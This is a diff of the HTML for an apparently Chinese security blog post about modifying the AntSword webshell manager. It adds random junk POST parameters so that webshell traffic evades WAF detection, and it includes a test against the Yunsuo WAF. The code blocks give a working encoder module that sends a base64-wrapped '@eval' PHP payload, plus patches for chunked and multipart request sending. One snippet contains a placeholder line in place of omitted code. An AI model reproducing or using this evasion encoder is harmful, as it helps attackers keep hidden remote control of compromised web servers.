@@ -10,13 +10,12 @@
     <title>蚁剑改造计划之增加垃圾数据 - </title><meta name="Description" content="蚁剑改造计划之增加垃圾数据"><meta property="og:title" content="蚁剑改造计划之增加垃圾数据" />
 <meta property="og:description" content="蚁剑改造计划之增加垃圾数据" />
 <meta property="og:type" content="article" />
-<meta property="og:url" content="https://yzddmr6.com/posts/antsword-diy-1/" /><meta property="og:image" content="https://yzddmr6.com/images/avatar.webp"/><meta property="article:section" content="posts" />
+<meta property="og:url" content="https://yzddmr6.com/posts/antsword-diy-1/" /><meta property="og:image" content="https://yzddmr6.com/images/avatar.webp" /><meta property="article:section" content="posts" />
 <meta property="article:published_time" content="2020-01-18T10:11:12+00:00" />
 <meta property="article:modified_time" content="2020-01-18T10:11:12+00:00" /><meta property="og:site_name" content="Hugo DoIt Theme Documentation" />
-<meta name="twitter:card" content="summary_large_image"/>
-<meta name="twitter:image" content="https://yzddmr6.com/images/avatar.webp"/>
 
-<meta name="twitter:title" content="蚁剑改造计划之增加垃圾数据"/>
+<meta name="twitter:card" content="summary_large_image" />
+<meta name="twitter:image" content="https://yzddmr6.com/images/avatar.webp" /><meta name="twitter:title" content="蚁剑改造计划之增加垃圾数据"/>
 <meta name="twitter:description" content="蚁剑改造计划之增加垃圾数据"/>
 <meta name="application-name" content="yzddMr6&#39;s Blog">
 <meta name="apple-mobile-web-app-title" content="yzddMr6&#39;s Blog">
@@ -216,25 +215,25 @@
 </span><span class="lnt">19
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">let varname_min = 5; //变量名最小长度
-</span></span><span class="line"><span class="cl">  let varname_max = 15; // 变量名最大长度
-</span></span><span class="line"><span class="cl">  let data_min = 200; // 变量值最小长度
-</span></span><span class="line"><span class="cl">  let data_max = 250; // 变量值最大长度
-</span></span><span class="line"><span class="cl">  let num_min = 150; // 变量最小个数
-</span></span><span class="line"><span class="cl">  let num_max = 250; // 变量最大个数
-</span></span><span class="line"><span class="cl">  function randomString(length) { // 生成随机字符串
-</span></span><span class="line"><span class="cl">    //let chars=&#39;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&#39;;
-</span></span><span class="line"><span class="cl">    let chars = &#39;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&#39;;
-</span></span><span class="line"><span class="cl">    let result = &#39;&#39;;
-</span></span><span class="line"><span class="cl">    for (let i = length; i &gt; 0; --i) result += chars[Math.floor(Math.random() * chars.length)];
-</span></span><span class="line"><span class="cl">    return result;
-</span></span><span class="line"><span class="cl">  }
-</span></span><span class="line"><span class="cl">  function randomInt(min, max) {   //生成指定范围内的随机数
-</span></span><span class="line"><span class="cl">    return parseInt(Math.random() * (max - min + 1) + min, 10);
-</span></span><span class="line"><span class="cl">  }
-</span></span><span class="line"><span class="cl">  for (let i = 0; i &lt; randomInt(num_min, num_max); i++) {  //将混淆流量放入到payload数组中
-</span></span><span class="line"><span class="cl">    data[randomString(randomInt(varname_min, varname_max))] = randomString(randomInt(data_min, data_max));
-</span></span><span class="line"><span class="cl">  }
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">let</span> <span class="n">varname_min</span> <span class="o">=</span> <span class="mi">5</span><span class="p">;</span> <span class="o">//</span><span class="err">变量名最小长度</span>
+</span></span><span class="line"><span class="cl">  <span class="n">let</span> <span class="n">varname_max</span> <span class="o">=</span> <span class="mi">15</span><span class="p">;</span> <span class="o">//</span> <span class="err">变量名最大长度</span>
+</span></span><span class="line"><span class="cl">  <span class="n">let</span> <span class="n">data_min</span> <span class="o">=</span> <span class="mi">200</span><span class="p">;</span> <span class="o">//</span> <span class="err">变量值最小长度</span>
+</span></span><span class="line"><span class="cl">  <span class="n">let</span> <span class="n">data_max</span> <span class="o">=</span> <span class="mi">250</span><span class="p">;</span> <span class="o">//</span> <span class="err">变量值最大长度</span>
+</span></span><span class="line"><span class="cl">  <span class="n">let</span> <span class="n">num_min</span> <span class="o">=</span> <span class="mi">150</span><span class="p">;</span> <span class="o">//</span> <span class="err">变量最小个数</span>
+</span></span><span class="line"><span class="cl">  <span class="n">let</span> <span class="n">num_max</span> <span class="o">=</span> <span class="mi">250</span><span class="p">;</span> <span class="o">//</span> <span class="err">变量最大个数</span>
+</span></span><span class="line"><span class="cl">  <span class="n">function</span> <span class="n">randomString</span><span class="p">(</span><span class="n">length</span><span class="p">)</span> <span class="p">{</span> <span class="o">//</span> <span class="err">生成随机字符串</span>
+</span></span><span class="line"><span class="cl">    <span class="o">//</span><span class="n">let</span> <span class="n">chars</span><span class="o">=</span><span class="s1">&#39;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">let</span> <span class="n">chars</span> <span class="o">=</span> <span class="s1">&#39;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">let</span> <span class="n">result</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="p">(</span><span class="n">let</span> <span class="n">i</span> <span class="o">=</span> <span class="n">length</span><span class="p">;</span> <span class="n">i</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">;</span> <span class="o">--</span><span class="n">i</span><span class="p">)</span> <span class="n">result</span> <span class="o">+=</span> <span class="n">chars</span><span class="p">[</span><span class="n">Math</span><span class="o">.</span><span class="n">floor</span><span class="p">(</span><span class="n">Math</span><span class="o">.</span><span class="n">random</span><span class="p">()</span> <span class="o">*</span> <span class="n">chars</span><span class="o">.</span><span class="n">length</span><span class="p">)];</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">result</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl">  <span class="n">function</span> <span class="n">randomInt</span><span class="p">(</span><span class="nb">min</span><span class="p">,</span> <span class="nb">max</span><span class="p">)</span> <span class="p">{</span>   <span class="o">//</span><span class="err">生成指定范围内的随机数</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">parseInt</span><span class="p">(</span><span class="n">Math</span><span class="o">.</span><span class="n">random</span><span class="p">()</span> <span class="o">*</span> <span class="p">(</span><span class="nb">max</span> <span class="o">-</span> <span class="nb">min</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span> <span class="o">+</span> <span class="nb">min</span><span class="p">,</span> <span class="mi">10</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl">  <span class="k">for</span> <span class="p">(</span><span class="n">let</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">randomInt</span><span class="p">(</span><span class="n">num_min</span><span class="p">,</span> <span class="n">num_max</span><span class="p">);</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>  <span class="o">//</span><span class="err">将混淆流量放入到</span><span class="n">payload数组中</span>
+</span></span><span class="line"><span class="cl">    <span class="n">data</span><span class="p">[</span><span class="n">randomString</span><span class="p">(</span><span class="n">randomInt</span><span class="p">(</span><span class="n">varname_min</span><span class="p">,</span> <span class="n">varname_max</span><span class="p">))]</span> <span class="o">=</span> <span class="n">randomString</span><span class="p">(</span><span class="n">randomInt</span><span class="p">(</span><span class="n">data_min</span><span class="p">,</span> <span class="n">data_max</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
 </span></span></code></pre></td></tr></table>
 </div>
 </div><p>那么怎么用呢</p>
@@ -273,36 +272,36 @@
 </span><span class="lnt">30
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&#39;use strict&#39;;
-</span></span><span class="line"><span class="cl">/*
-</span></span><span class="line"><span class="cl">code by yzddMr6
-</span></span><span class="line"><span class="cl">*/
-</span></span><span class="line"><span class="cl">module.exports = (pwd, data, ext = {}) =&gt; {
-</span></span><span class="line"><span class="cl">  let varname_min = 5;
-</span></span><span class="line"><span class="cl">  let varname_max = 15;
-</span></span><span class="line"><span class="cl">  let data_min = 200;
-</span></span><span class="line"><span class="cl">  let data_max = 250;
-</span></span><span class="line"><span class="cl">  let num_min = 100;
-</span></span><span class="line"><span class="cl">  let num_max = 200;
-</span></span><span class="line"><span class="cl">  let randomID = `_0x${Math.random().toString(16).substr(2)}`;
-</span></span><span class="line"><span class="cl">  data[randomID] = Buffer.from(data[&#39;_&#39;]).toString(&#39;base64&#39;);
-</span></span><span class="line"><span class="cl">  function randomString(length) {
-</span></span><span class="line"><span class="cl">    //let chars=&#39;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&#39;;
-</span></span><span class="line"><span class="cl">    let chars = &#39;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&#39;;
-</span></span><span class="line"><span class="cl">    let result = &#39;&#39;;
-</span></span><span class="line"><span class="cl">    for (let i = length; i &gt; 0; --i) result += chars[Math.floor(Math.random() * chars.length)];
-</span></span><span class="line"><span class="cl">    return result;
-</span></span><span class="line"><span class="cl">  }
-</span></span><span class="line"><span class="cl">  function randomInt(min, max) {
-</span></span><span class="line"><span class="cl">    return parseInt(Math.random() * (max - min + 1) + min, 10);
-</span></span><span class="line"><span class="cl">  }
-</span></span><span class="line"><span class="cl">  for (let i = 0; i &lt; randomInt(num_min, num_max); i++) {
-</span></span><span class="line"><span class="cl">    data[randomString(randomInt(varname_min, varname_max))] = randomString(randomInt(data_min, data_max));
-</span></span><span class="line"><span class="cl">  }
-</span></span><span class="line"><span class="cl">  data[pwd] = `@eval(base64_decode($_POST[${randomID}]));`;
-</span></span><span class="line"><span class="cl">  delete data[&#39;_&#39;];
-</span></span><span class="line"><span class="cl">  return data;
-</span></span><span class="line"><span class="cl">}
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="s1">&#39;use strict&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="o">/*</span>
+</span></span><span class="line"><span class="cl"><span class="n">code</span> <span class="n">by</span> <span class="n">yzddMr6</span>
+</span></span><span class="line"><span class="cl"><span class="o">*/</span>
+</span></span><span class="line"><span class="cl"><span class="n">module</span><span class="o">.</span><span class="n">exports</span> <span class="o">=</span> <span class="p">(</span><span class="n">pwd</span><span class="p">,</span> <span class="n">data</span><span class="p">,</span> <span class="n">ext</span> <span class="o">=</span> <span class="p">{})</span> <span class="o">=&gt;</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="n">let</span> <span class="n">varname_min</span> <span class="o">=</span> <span class="mi">5</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="n">let</span> <span class="n">varname_max</span> <span class="o">=</span> <span class="mi">15</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="n">let</span> <span class="n">data_min</span> <span class="o">=</span> <span class="mi">200</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="n">let</span> <span class="n">data_max</span> <span class="o">=</span> <span class="mi">250</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="n">let</span> <span class="n">num_min</span> <span class="o">=</span> <span class="mi">100</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="n">let</span> <span class="n">num_max</span> <span class="o">=</span> <span class="mi">200</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="n">let</span> <span class="n">randomID</span> <span class="o">=</span> <span class="err">`</span><span class="n">_0x</span><span class="o">$</span><span class="p">{</span><span class="n">Math</span><span class="o">.</span><span class="n">random</span><span class="p">()</span><span class="o">.</span><span class="n">toString</span><span class="p">(</span><span class="mi">16</span><span class="p">)</span><span class="o">.</span><span class="n">substr</span><span class="p">(</span><span class="mi">2</span><span class="p">)}</span><span class="err">`</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="n">data</span><span class="p">[</span><span class="n">randomID</span><span class="p">]</span> <span class="o">=</span> <span class="n">Buffer</span><span class="o">.</span><span class="n">from</span><span class="p">(</span><span class="n">data</span><span class="p">[</span><span class="s1">&#39;_&#39;</span><span class="p">])</span><span class="o">.</span><span class="n">toString</span><span class="p">(</span><span class="s1">&#39;base64&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="n">function</span> <span class="n">randomString</span><span class="p">(</span><span class="n">length</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="o">//</span><span class="n">let</span> <span class="n">chars</span><span class="o">=</span><span class="s1">&#39;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">let</span> <span class="n">chars</span> <span class="o">=</span> <span class="s1">&#39;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">let</span> <span class="n">result</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="p">(</span><span class="n">let</span> <span class="n">i</span> <span class="o">=</span> <span class="n">length</span><span class="p">;</span> <span class="n">i</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">;</span> <span class="o">--</span><span class="n">i</span><span class="p">)</span> <span class="n">result</span> <span class="o">+=</span> <span class="n">chars</span><span class="p">[</span><span class="n">Math</span><span class="o">.</span><span class="n">floor</span><span class="p">(</span><span class="n">Math</span><span class="o">.</span><span class="n">random</span><span class="p">()</span> <span class="o">*</span> <span class="n">chars</span><span class="o">.</span><span class="n">length</span><span class="p">)];</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">result</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl">  <span class="n">function</span> <span class="n">randomInt</span><span class="p">(</span><span class="nb">min</span><span class="p">,</span> <span class="nb">max</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">parseInt</span><span class="p">(</span><span class="n">Math</span><span class="o">.</span><span class="n">random</span><span class="p">()</span> <span class="o">*</span> <span class="p">(</span><span class="nb">max</span> <span class="o">-</span> <span class="nb">min</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span> <span class="o">+</span> <span class="nb">min</span><span class="p">,</span> <span class="mi">10</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl">  <span class="k">for</span> <span class="p">(</span><span class="n">let</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">randomInt</span><span class="p">(</span><span class="n">num_min</span><span class="p">,</span> <span class="n">num_max</span><span class="p">);</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="n">data</span><span class="p">[</span><span class="n">randomString</span><span class="p">(</span><span class="n">randomInt</span><span class="p">(</span><span class="n">varname_min</span><span class="p">,</span> <span class="n">varname_max</span><span class="p">))]</span> <span class="o">=</span> <span class="n">randomString</span><span class="p">(</span><span class="n">randomInt</span><span class="p">(</span><span class="n">data_min</span><span class="p">,</span> <span class="n">data_max</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl">  <span class="n">data</span><span class="p">[</span><span class="n">pwd</span><span class="p">]</span> <span class="o">=</span> <span class="err">`@</span><span class="n">eval</span><span class="p">(</span><span class="n">base64_decode</span><span class="p">(</span><span class="o">$</span><span class="n">_POST</span><span class="p">[</span><span class="o">$</span><span class="p">{</span><span class="n">randomID</span><span class="p">}]));</span><span class="err">`</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="n">delete</span> <span class="n">data</span><span class="p">[</span><span class="s1">&#39;_&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="n">data</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
 </span></span></code></pre></td></tr></table>
 </div>
 </div><h3 id="过云锁测试" class="headerLink">
@@ -524,70 +523,70 @@
 </span><span class="lnt">64
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">/**
-</span></span><span class="line"><span class="cl">   * 监听HTTP请求
-</span></span><span class="line"><span class="cl">   * @param  {Object} event ipcMain事件对象
-</span></span><span class="line"><span class="cl">   * @param  {Object} opts  请求配置
-</span></span><span class="line"><span class="cl">   * @return {[type]}       [description]
-</span></span><span class="line"><span class="cl">   */
-</span></span><span class="line"><span class="cl">  onRequest(event, opts) {
-</span></span><span class="line"><span class="cl">    logger.debug(&#39;onRequest::opts&#39;, opts);
-</span></span><span class="line"><span class="cl">    if (opts[&#39;url&#39;].match(CONF.urlblacklist)) {
-</span></span><span class="line"><span class="cl">      return event
-</span></span><span class="line"><span class="cl">        .sender
-</span></span><span class="line"><span class="cl">        .send(&#39;request-error-&#39; + opts[&#39;hash&#39;], &#34;Blacklist URL&#34;);
-</span></span><span class="line"><span class="cl">    }
-</span></span><span class="line"><span class="cl">    let _request = superagent.post(opts[&#39;url&#39;]);
-</span></span><span class="line"><span class="cl">    // 设置headers
-</span></span><span class="line"><span class="cl">    _request.set(&#39;User-Agent&#39;, USER_AGENT);
-</span></span><span class="line"><span class="cl">    // 自定义headers
-</span></span><span class="line"><span class="cl">    for (let _ in opts.headers) {
-</span></span><span class="line"><span class="cl">      _request.set(_, opts.headers[_]);
-</span></span><span class="line"><span class="cl">    }
-</span></span><span class="line"><span class="cl">    // 自定义body
-</span></span><span class="line"><span class="cl">    const _postData = Object.assign({}, opts.body, opts.data);
-</span></span><span class="line"><span class="cl">    if (opts[&#39;useChunk&#39;] == 1) {
-</span></span><span class="line"><span class="cl">      logger.debug(&#34;request with Chunked&#34;);
-</span></span><span class="line"><span class="cl">      let _postarr = [];
-</span></span><span class="line"><span class="cl">      for (var key in _postData) {
-</span></span><span class="line"><span class="cl">        if (_postData.hasOwnProperty(key)) {
-</span></span><span class="line"><span class="cl">          let _tmp = encodeURIComponent(_postData[key]).replace(/asunescape\((.+?)\)/g, function ($, $1) {
-</span></span><span class="line"><span class="cl">            return unescape($1);
-</span></span><span class="line"><span class="cl">          }); // 后续可能需要二次处理的在这里追加
-</span></span><span class="line"><span class="cl">          _postarr.push(`${key}=${_tmp}`);
-</span></span><span class="line"><span class="cl">        }
-</span></span><span class="line"><span class="cl">      }
-</span></span><span class="line"><span class="cl">      let antstream = new AntRead(_postarr.join(&#34;&amp;&#34;), {
-</span></span><span class="line"><span class="cl">        &#39;step&#39;: parseInt(opts[&#39;chunkStepMin&#39;]),
-</span></span><span class="line"><span class="cl">        &#39;stepmax&#39;: parseInt(opts[&#39;chunkStepMax&#39;])
-</span></span><span class="line"><span class="cl">      });
-</span></span><span class="line"><span class="cl">	xxxxxxx
-</span></span><span class="line"><span class="cl">    } else {
-</span></span><span class="line"><span class="cl">      // 通过替换函数方式来实现发包方式切换, 后续可改成别的
-</span></span><span class="line"><span class="cl">      const old_send = _request.send;
-</span></span><span class="line"><span class="cl">      let _postarr = [];
-</span></span><span class="line"><span class="cl">      if (opts[&#39;useMultipart&#39;] == 1) {
-</span></span><span class="line"><span class="cl">        _request.send = _request.field;
-</span></span><span class="line"><span class="cl">        for (var key in _postData) {
-</span></span><span class="line"><span class="cl">          if (_postData.hasOwnProperty(key)) {
-</span></span><span class="line"><span class="cl">            let _tmp = (_postData[key]).replace(/asunescape\((.+?)\)/g, function ($, $1) {
-</span></span><span class="line"><span class="cl">              return unescape($1)
-</span></span><span class="line"><span class="cl">            });
-</span></span><span class="line"><span class="cl">            _postarr[key] = _tmp;
-</span></span><span class="line"><span class="cl">          }
-</span></span><span class="line"><span class="cl">        }
-</span></span><span class="line"><span class="cl">      } else {
-</span></span><span class="line"><span class="cl">        _request.send = old_send;
-</span></span><span class="line"><span class="cl">        for (var key in _postData) {
-</span></span><span class="line"><span class="cl">          if (_postData.hasOwnProperty(key)) {
-</span></span><span class="line"><span class="cl">            let _tmp = encodeURIComponent(_postData[key]).replace(/asunescape\((.+?)\)/g, function ($, $1) {
-</span></span><span class="line"><span class="cl">              return unescape($1)
-</span></span><span class="line"><span class="cl">            }); // 后续可能需要二次处理的在这里追加
-</span></span><span class="line"><span class="cl">            _postarr.push(`${key}=${_tmp}`);
-</span></span><span class="line"><span class="cl">          }
-</span></span><span class="line"><span class="cl">        }
-</span></span><span class="line"><span class="cl">        _postarr = _postarr.join(&#39;&amp;&#39;);
-</span></span><span class="line"><span class="cl">      }
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="o">/**</span>
+</span></span><span class="line"><span class="cl">   <span class="o">*</span> <span class="err">监听</span><span class="n">HTTP请求</span>
+</span></span><span class="line"><span class="cl">   <span class="o">*</span> <span class="err">@</span><span class="n">param</span>  <span class="p">{</span><span class="ne">Object</span><span class="p">}</span> <span class="n">event</span> <span class="n">ipcMain事件对象</span>
+</span></span><span class="line"><span class="cl">   <span class="o">*</span> <span class="err">@</span><span class="n">param</span>  <span class="p">{</span><span class="ne">Object</span><span class="p">}</span> <span class="n">opts</span>  <span class="err">请求配置</span>
+</span></span><span class="line"><span class="cl">   <span class="o">*</span> <span class="err">@</span><span class="k">return</span> <span class="p">{[</span><span class="n">type</span><span class="p">]}</span>       <span class="p">[</span><span class="n">description</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">   <span class="o">*/</span>
+</span></span><span class="line"><span class="cl">  <span class="n">onRequest</span><span class="p">(</span><span class="n">event</span><span class="p">,</span> <span class="n">opts</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="n">logger</span><span class="o">.</span><span class="n">debug</span><span class="p">(</span><span class="s1">&#39;onRequest::opts&#39;</span><span class="p">,</span> <span class="n">opts</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">opts</span><span class="p">[</span><span class="s1">&#39;url&#39;</span><span class="p">]</span><span class="o">.</span><span class="n">match</span><span class="p">(</span><span class="n">CONF</span><span class="o">.</span><span class="n">urlblacklist</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">      <span class="k">return</span> <span class="n">event</span>
+</span></span><span class="line"><span class="cl">        <span class="o">.</span><span class="n">sender</span>
+</span></span><span class="line"><span class="cl">        <span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s1">&#39;request-error-&#39;</span> <span class="o">+</span> <span class="n">opts</span><span class="p">[</span><span class="s1">&#39;hash&#39;</span><span class="p">],</span> <span class="s2">&#34;Blacklist URL&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="n">let</span> <span class="n">_request</span> <span class="o">=</span> <span class="n">superagent</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">opts</span><span class="p">[</span><span class="s1">&#39;url&#39;</span><span class="p">]);</span>
+</span></span><span class="line"><span class="cl">    <span class="o">//</span> <span class="err">设置</span><span class="n">headers</span>
+</span></span><span class="line"><span class="cl">    <span class="n">_request</span><span class="o">.</span><span class="n">set</span><span class="p">(</span><span class="s1">&#39;User-Agent&#39;</span><span class="p">,</span> <span class="n">USER_AGENT</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="o">//</span> <span class="err">自定义</span><span class="n">headers</span>
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="p">(</span><span class="n">let</span> <span class="n">_</span> <span class="ow">in</span> <span class="n">opts</span><span class="o">.</span><span class="n">headers</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">      <span class="n">_request</span><span class="o">.</span><span class="n">set</span><span class="p">(</span><span class="n">_</span><span class="p">,</span> <span class="n">opts</span><span class="o">.</span><span class="n">headers</span><span class="p">[</span><span class="n">_</span><span class="p">]);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="o">//</span> <span class="err">自定义</span><span class="n">body</span>
+</span></span><span class="line"><span class="cl">    <span class="k">const</span> <span class="n">_postData</span> <span class="o">=</span> <span class="ne">Object</span><span class="o">.</span><span class="n">assign</span><span class="p">({},</span> <span class="n">opts</span><span class="o">.</span><span class="n">body</span><span class="p">,</span> <span class="n">opts</span><span class="o">.</span><span class="n">data</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">opts</span><span class="p">[</span><span class="s1">&#39;useChunk&#39;</span><span class="p">]</span> <span class="o">==</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">      <span class="n">logger</span><span class="o">.</span><span class="n">debug</span><span class="p">(</span><span class="s2">&#34;request with Chunked&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">      <span class="n">let</span> <span class="n">_postarr</span> <span class="o">=</span> <span class="p">[];</span>
+</span></span><span class="line"><span class="cl">      <span class="k">for</span> <span class="p">(</span><span class="k">var</span> <span class="n">key</span> <span class="ow">in</span> <span class="n">_postData</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="n">_postData</span><span class="o">.</span><span class="n">hasOwnProperty</span><span class="p">(</span><span class="n">key</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">          <span class="n">let</span> <span class="n">_tmp</span> <span class="o">=</span> <span class="n">encodeURIComponent</span><span class="p">(</span><span class="n">_postData</span><span class="p">[</span><span class="n">key</span><span class="p">])</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="o">/</span><span class="n">asunescape</span>\<span class="p">((</span><span class="o">.+</span><span class="err">?</span><span class="p">)</span>\<span class="p">)</span><span class="o">/</span><span class="n">g</span><span class="p">,</span> <span class="n">function</span> <span class="p">(</span><span class="o">$</span><span class="p">,</span> <span class="o">$</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="n">unescape</span><span class="p">(</span><span class="o">$</span><span class="mi">1</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">          <span class="p">});</span> <span class="o">//</span> <span class="err">后续可能需要二次处理的在这里追加</span>
+</span></span><span class="line"><span class="cl">          <span class="n">_postarr</span><span class="o">.</span><span class="n">push</span><span class="p">(</span><span class="err">`</span><span class="o">$</span><span class="p">{</span><span class="n">key</span><span class="p">}</span><span class="o">=$</span><span class="p">{</span><span class="n">_tmp</span><span class="p">}</span><span class="err">`</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">      <span class="p">}</span>
+</span></span><span class="line"><span class="cl">      <span class="n">let</span> <span class="n">antstream</span> <span class="o">=</span> <span class="n">new</span> <span class="n">AntRead</span><span class="p">(</span><span class="n">_postarr</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="s2">&#34;&amp;&#34;</span><span class="p">),</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="s1">&#39;step&#39;</span><span class="p">:</span> <span class="n">parseInt</span><span class="p">(</span><span class="n">opts</span><span class="p">[</span><span class="s1">&#39;chunkStepMin&#39;</span><span class="p">]),</span>
+</span></span><span class="line"><span class="cl">        <span class="s1">&#39;stepmax&#39;</span><span class="p">:</span> <span class="n">parseInt</span><span class="p">(</span><span class="n">opts</span><span class="p">[</span><span class="s1">&#39;chunkStepMax&#39;</span><span class="p">])</span>
+</span></span><span class="line"><span class="cl">      <span class="p">});</span>
+</span></span><span class="line"><span class="cl">	<span class="n">xxxxxxx</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">      <span class="o">//</span> <span class="err">通过替换函数方式来实现发包方式切换</span><span class="p">,</span> <span class="err">后续可改成别的</span>
+</span></span><span class="line"><span class="cl">      <span class="k">const</span> <span class="n">old_send</span> <span class="o">=</span> <span class="n">_request</span><span class="o">.</span><span class="n">send</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">      <span class="n">let</span> <span class="n">_postarr</span> <span class="o">=</span> <span class="p">[];</span>
+</span></span><span class="line"><span class="cl">      <span class="k">if</span> <span class="p">(</span><span class="n">opts</span><span class="p">[</span><span class="s1">&#39;useMultipart&#39;</span><span class="p">]</span> <span class="o">==</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">_request</span><span class="o">.</span><span class="n">send</span> <span class="o">=</span> <span class="n">_request</span><span class="o">.</span><span class="n">field</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="p">(</span><span class="k">var</span> <span class="n">key</span> <span class="ow">in</span> <span class="n">_postData</span><span class="p">)</span> <span class="p">{</span>
